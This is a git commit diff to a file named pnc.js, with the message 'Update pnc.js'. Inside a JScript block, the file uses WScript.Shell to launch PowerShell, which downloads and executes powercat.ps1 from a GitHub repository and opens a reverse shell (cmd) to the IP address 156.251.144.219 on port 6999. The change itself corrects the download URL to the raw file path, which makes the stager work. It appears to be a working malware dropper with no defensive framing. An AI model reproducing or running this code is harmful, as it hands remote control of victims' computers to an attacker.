500d84d581490078bc0959987e7487d8063c6586
AlexIThelp <143997305+AlexIThelp@users.noreply.github.com>
2023-09-04 02:26:16 -0700

    Update pnc.js

--- pnc.js
+++ pnc.js
@@ -5,7 +5,7 @@
 
 <script language="JScript">
 
-var r = new ActiveXObject("WScript.Shell").Run("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/AlexIThelp/it/blob/master/powercat.ps1');powercat -c 156.251.144.219 -p 6999 -e cmd"); 
+var r = new ActiveXObject("WScript.Shell").Run("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/AlexIThelp/it/master/powercat.ps1');powercat -c 156.251.144.219 -p 6999 -e cmd"); 
 
 </script>
 
